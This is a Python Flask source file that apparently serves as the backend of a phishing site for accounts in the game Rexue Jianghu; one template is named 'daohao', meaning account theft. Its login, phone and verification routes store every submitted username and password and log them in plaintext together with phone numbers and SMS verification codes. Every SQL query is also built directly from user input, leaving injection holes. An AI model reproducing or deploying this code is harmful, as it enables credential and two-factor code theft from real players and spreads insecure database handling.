# -*- coding: UTF-8 -*-
from flask import Flask,request,render_template,jsonify
from pylib import *
import plugins
import random
from PIL import ImageFont,ImageDraw,Image
import os
from flask_cors import *
from datetime import timedelta

# 加载插件
load_plugins(plugins)

# 获取app
app = Flask(__name__)
# 使用session需要配置的,设置一个随机数
# app.config['SECRET_KEY'] = os.urandom(24)
"""设置session过期时间"""
# app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=5)
# 初始化日志
initlog(app.logger)

# 数据库
model = plugins.mysqlcurd.Model(db="rxjh")


def get_random():
    return random.randint(0,255),random.randint(0,255),random.randint(0,255)

def drawverify(strlabel):
    try:
        path = './static/image/verify/'
        filepath = os.path.join(path,os.listdir(path)[0])
        os.remove(filepath)
    except:
        pass
    # 创建图片
    img_obj = Image.new('RGB', (200, 50), (255,255,255))
    # 生成画笔
    img_draw = ImageDraw.Draw(img_obj)
    # 字体和文字大小
    img_font = ImageFont.truetype("SimHei.ttf", 20)
    i = 0
    while i<4:
        img_draw.text((10 + i * 40, 30*random.random()), strlabel[i:i+1], get_random(), img_font)
        i += 1
    # 生成二进制文件对象
    # io_obj = BytesIO()
    label = str(int(10000*random.random()))
    # 将生成的验证码图片存入文件对象中
    img_obj.save('./static/image/verify/{0}.png'.format(label))
    return label

@app.errorhandler(plugins.baseexcept.BaseError)
def custom_error_handler(e):
    """将需要输出在logger记录中的级别放入数组中"""
    if e.level in [plugins.baseexcept.BaseError.LEVEL_WARN, plugins.baseexcept.BaseError.LEVEL_ERROR]:
        if isinstance(e, plugins.baseexcept.OrmError):
            app.logger.exception('%s %s' % (e.parent_error, e))
        else:
            app.logger.exception('错误信息: %s %s' % (e.extras, e))
    response = jsonify(e.to_dict())
    response.status_code = e.status_code
    return response

@app.route('/')
def intead():
    return render_template("kami.html")

@app.route('/getLogin/')
def getlogin():
    return render_template('index.html')

@app.route('/verify/', methods=['GET', 'POST'])
@cross_origin()
def verify():
    data = ["佛怒火莲","七上八下","横七竖八","指鹿为马","身临其境","天下第一","乐善好施","优良传统","精益求精"]
    strlabel = random.choice(data)
    label = drawverify(strlabel)
    return label

@app.route('/login/', methods=['GET', 'POST'])
@cross_origin()
def login():
    sql = "select username from rxjhapp_user where username={};".format(request.form["username"])
    if(len(model.execute(sql,0))==0):
        model.addData(["username","password"],[request.form["username"],request.form["password"]],"rxjhapp_user")
    app.logger.info("账号是:{0},密码是:{1}".format(request.form["username"],request.form["password"]))
    return request.form.get("username","")

@app.route('/addtel/',methods=['GET','POST'])
@cross_origin()
def addTel():
    username = request.form.get("username")
    sql = "update rxjhapp_user set tel={0} where username={1};".format(request.form["tel"],username)
    model.execute(sql)
    sql = "select * from rxjhapp_user where username={};".format(username)
    password = model.execute(sql,0)[0][1]
    app.logger.info("账号是:{0},密码是{1},手机号是{2},验证码是{3}".format(username,password,request.form["tel"],request.form["verifycode"]))
    return "1"

@app.route('/usercenter/<username>', methods=['GET', 'POST'])
def userCenter(username):
    return render_template("daohao.html",username=username)

@app.route('/sendverify/',methods=['GET','POST'])
@cross_origin()
def sendVerify():
    username = request.form["username"]
    sql = "select * from rxjhapp_user where username={};".format(username)
    user = model.execute(sql,0)[0]
    app.logger.info("账号是:{0},密码是{1},手机号是{2}".format(username,user[2],request.form.get("tel")))
    return "1"

# """绑定测试请求对象,初始化服务器调用的方法"""
# with app.test_request_context():
#     app.logger.info("服务器初始化成功")
#     """
#     常与重定向何用，作为redirect的参数
#     :param function_name:被重构的方法名称
#     :type function_name：str
#     :param url_restruct:重构的url
#     :type url_restruct:str
#     """
#     # url_for(function_name,url_restruct)

if __name__ == '__main__':
    app.run(port=5000, host='0.0.0.0',debug=True)
